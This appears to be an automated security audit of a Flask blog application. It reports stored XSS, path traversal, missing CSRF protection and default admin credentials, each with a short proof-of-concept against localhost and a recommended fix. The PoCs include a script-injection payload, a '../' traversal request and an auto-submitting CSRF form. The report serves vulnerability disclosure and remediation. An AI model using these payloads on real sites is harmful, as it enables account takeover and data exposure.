====

Auto Security Analysis of blog at 2026-02-20
CRITICAL - Stored XSS via Blog Post Content
The `post.html` template uses the `|safe` filter to render the `content` of a blog post. Since the application uses `markdown2` to convert Markdown to HTML without enabling any sanitization options, any HTML tags included in the Markdown content will be rendered as-is. An attacker with access to the `create_post` route (e.g., via compromised credentials or CSRF) can inject malicious `<script>` tags that will execute in the context of any user viewing the post. This can lead to session hijacking, defacement, or redirection to malicious sites.

PoC
```python
import requests

# Assuming the app is running locally and default credentials are used
# In a real scenario, this could also be achieved via CSRF if the admin is logged in
session = requests.Session()
session.post('http://localhost:5000/login', data={'username': 'admin', 'password': 'admin'})

# Create a malicious post
payload = {
    'title': 'XSS Test',
    'author': 'attacker',
    'tags': 'xss',
    'content': 'Check this out! <script>alert("XSS")</script>'
}
session.post('http://localhost:5000/create_post', data=payload)

# Anyone visiting /post/XSS_Test will now trigger the script alert.
```

Fix
Remove the `|safe` filter from the `post.html` template to allow Jinja2 to escape HTML by default, or use a library like `bleach` to sanitize the HTML output of `markdown2` before passing it to the template if rendering some HTML is intended.

====

====

Auto Security Analysis of blog at 2026-02-20
MEDIUM - Path Traversal in Post Retrieval
The `/post/<name>` route takes a `name` parameter and directly joins it with the `POSTS_DIR` path and a `.md` extension. Because the `name` parameter is not sanitized, an attacker can use `../` sequences to traverse out of the intended directory and read any file on the system that ends with a `.md` extension.

PoC
```python
import requests

# Attacker tries to read a sensitive file that might exist as .md elsewhere on the system
# For example, if there's a file /etc/some_config.md (simulated here)
response = requests.get('http://localhost:5000/post/../../../../etc/some_config')
print(response.text)
```

Fix
Use `werkzeug.utils.secure_filename` on the `name` parameter before joining it with the directory path, or verify that the resolved path is still within the intended directory.

====

====

Auto Security Analysis of blog at 2026-02-20
MEDIUM - Lack of CSRF Protection
The application does not implement any Cross-Site Request Forgery (CSRF) protection for its state-changing routes, such as `/create_post`, `/upload/`, and `/login`. This allows an attacker to trick a logged-in administrator into performing unintended actions by making them visit a malicious website that submits forms to the blog application.

PoC
```html
<!-- Malicious website that creates a blog post automatically when visited by a logged-in admin -->
<html>
  <body onload="document.forms[0].submit()">
    <form action="http://localhost:5000/create_post" method="POST">
      <input type="hidden" name="title" value="CSRF Post" />
      <input type="hidden" name="author" value="attacker" />
      <input type="hidden" name="tags" value="csrf" />
      <input type="hidden" name="content" value="<script>alert('CSRF')</script>" />
    </form>
  </body>
</html>
```

Fix
Implement CSRF protection using a library like `Flask-WTF`, which adds a unique token to each form and verifies it upon submission.

====

====

Auto Security Analysis of blog at 2026-02-20
LOW - Insecure Default Credentials
The application defaults to `admin` as both the username and password if the `ADMIN_USERNAME` and `ADMIN_PASSWORD` environment variables are not set. This makes the application highly vulnerable to unauthorized access if deployed with default configurations.

PoC
```python
import requests

response = requests.post('http://localhost:5000/login', data={'username': 'admin', 'password': 'admin'})
if response.status_code == 200:
    print("Successfully logged in with default credentials!")
```

Fix
Remove default credentials and require them to be explicitly set via environment variables, or force a password change upon first login.

====

### Summary of Vulnerabilities

| Severity | Exploit Name |
|----------|--------------|
| CRITICAL | Stored XSS via Blog Post Content |
| MEDIUM   | Path Traversal in Post Retrieval |
| MEDIUM   | Lack of CSRF Protection |
| LOW      | Insecure Default Credentials |
